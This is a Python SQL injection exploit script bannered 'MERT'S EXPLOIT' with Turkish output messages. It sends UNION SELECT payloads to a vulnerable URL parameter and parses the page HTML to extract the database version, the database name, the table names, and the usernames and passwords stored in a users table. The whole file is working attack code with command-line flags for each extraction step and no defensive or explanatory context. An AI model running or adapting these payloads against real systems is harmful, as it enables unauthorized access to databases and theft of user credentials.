import requests
import re
import urllib3
import argparse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def print_banner():
    banner = """
    ███╗   ███╗███████╗██████╗ ████████╗    ██╗   ██╗ █████╗ ███████╗████████╗
    ████╗ ████║██╔════╝██╔══██╗╚══██╔══╝    ██║   ██║██╔══██╗██╔════╝╚══██╔══╝
    ██╔████╔██║█████╗  ██████╔╝   ██║       ██║   ██║███████║███████╗   ██║   
    ██║╚██╔╝██║██╔══╝  ██╔══██╗   ██║       ██║   ██║██╔══██║╚════██║   ██║   
    ██║ ╚═╝ ██║███████╗██║  ██║   ██║       ╚██████╔╝██║  ██║███████║   ██║   
    ╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝        ╚═════╝ ╚═╝  ╚═╝╚══════╝   ╚═╝   
                                    MERT'S EXPLOIT
    """
    print(banner)

def get_version(vulnerable_url):
    version_payload = "+UNION+SELECT+1,2,@@version,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23--"
    get_dbmsversion = vulnerable_url + version_payload
    response = requests.get(url=get_dbmsversion, allow_redirects=False, verify=False)
    if "MariaDB" in response.text:
        version_key = "[^>]+MariaDB"
        version_search = re.search(version_key, response.text)
        print("DMBS Version : " + version_search.group(0) + "\n")
    else:
        print("DBMS MariaDB değil.")

def get_dbname(vulnerable_url):
    dbname_payload = "+UNION+SELECT+1,2,database(),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23--"
    get_dbname = vulnerable_url + dbname_payload
    response = requests.get(url=get_dbname, allow_redirects=False, verify=False)
    dbname_key = '<img class="item-img" src="Resources/img/13" alt=[^>]+>'
    dbname_search = re.search(dbname_key, response.text)
    dbname_key2 = "alt=[^>]+>"
    dbname_search2 = re.search(dbname_key2, dbname_search.group(0))
    dbname_search2.group(0)
    print("Database Name : " + dbname_search2.group(0).replace("alt=", "").replace("\"", "").replace(">", "") + "\n")

def get_tbname(vulnerable_url):
    tbname_payload = "+UNION+SELECT+1,2,(SELECT+group_concat(table_name)+FROM+information_schema.tables+WHERE+table_schema=database()),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23--"
    get_tbname = vulnerable_url + tbname_payload
    response = requests.get(url=get_tbname, allow_redirects=False, verify=False)
    tbname_key = '<img class="item-img" src="Resources/img/13" alt=[^>]+>'
    tbname_search = re.search(tbname_key, response.text)
    tbname_key2 = "alt=[^>]+>"
    tbname_search2 = re.search(tbname_key2, tbname_search.group(0))
    tbname_search2.group(0)
    print("Table Names : " + tbname_search2.group(0).replace("alt=", "").replace("\"", "").replace(">", "") + "\n")

def get_userstable(vulnerable_url):
    clname_payload = "+UNION+ALL+SELECT+1,2,(SELECT+min(username)+FROM+users),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23--"
    get_clname = vulnerable_url + clname_payload
    response = requests.get(url=get_clname, allow_redirects=False, verify=False)
    clname_key = '<img class="item-img" src="Resources/img/13" alt=[^>]+>'
    clname_search = re.search(clname_key, response.text)
    clname_key2 = "alt=[^>]+>"
    clname_search2 = re.search(clname_key2, clname_search.group(0))
    print("###### USERS TABLE ######\n#   ID=1 User : " + clname_search2.group(0).replace("alt=", "").replace("\"", "").replace(">", "") + "  #")

    clname_payload_2 = "+UNION+ALL+SELECT+1,2,(SELECT+max(username)+FROM+users),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23--"
    get_clname_2 = vulnerable_url + clname_payload_2
    response = requests.get(url=get_clname_2, allow_redirects=False, verify=False)
    clname_key_2 = '<img class="item-img" src="Resources/img/13" alt=[^>]+>'
    clname_search_2 = re.search(clname_key_2, response.text)
    clname_key2_2 = "alt=[^>]+>"
    clname_search_2 = re.search(clname_key2_2, clname_search_2.group(0))
    print("#   ID=2 User : " + clname_search_2.group(0).replace("alt=", "").replace("\"", "").replace(">", "") + "    #\n#########################\n")

def get_password(vulnerable_url):
    password_payload = "+UNION+ALL+SELECT+1,2,(SELECT+min(password)+FROM+users),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23--"
    get_password = vulnerable_url + password_payload
    response = requests.get(url=get_password, allow_redirects=False, verify=False)
    password_key = '<img class="item-img" src="Resources/img/13" alt=[^>]+>'
    password_search = re.search(password_key, response.text)
    password_key2 = "alt=[^>]+>"
    password_search2 = re.search(password_key2, password_search.group(0))
    password_search2.group(0)
    print("ID=1 User : " + password_search2.group(0).replace("alt=", "").replace("\"", "").replace(">", "") + "\n")

    pw_payload_2 = "+UNION+ALL+SELECT+1,2,(SELECT+max(password)+FROM+users),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23--"
    get_pw_2 = vulnerable_url + pw_payload_2
    response = requests.get(url=get_pw_2, allow_redirects=False, verify=False)
    pw_key_2 = '<img class="item-img" src="Resources/img/13" alt=[^>]+>'
    pw_search_2 = re.search(pw_key_2, response.text)
    pw_key2_2 = "alt=[^>]+>"
    pw_search_2 = re.search(pw_key2_2, pw_search_2.group(0))
    print("ID=2 User : " + pw_search_2.group(0).replace("alt=", "").replace("\"", "").replace(">", "") + "\n")

def main():
    print_banner()
    parser = argparse.ArgumentParser(description="SQL Injection Test Script")
    parser.add_argument("url", help="URL of the vulnerable parameter")
    parser.add_argument("--version", action="store_true", help="Extract DBMS version")
    parser.add_argument("--database", action="store_true", help="Extract database name")
    parser.add_argument("--tables", action="store_true", help="Extract table names")
    parser.add_argument("--users", action="store_true", help="Extract users table")
    parser.add_argument("--passwords", action="store_true", help="Extract user passwords")
    
    args = parser.parse_args()
    vulnerable_url = args.url
    
    if args.version:
        get_version(vulnerable_url)
    if args.database:
        get_dbname(vulnerable_url)
    if args.tables:
        get_tbname(vulnerable_url)
    if args.users:
        get_userstable(vulnerable_url)
    if args.passwords:
        get_password(vulnerable_url)

if __name__ == "__main__":
    main()
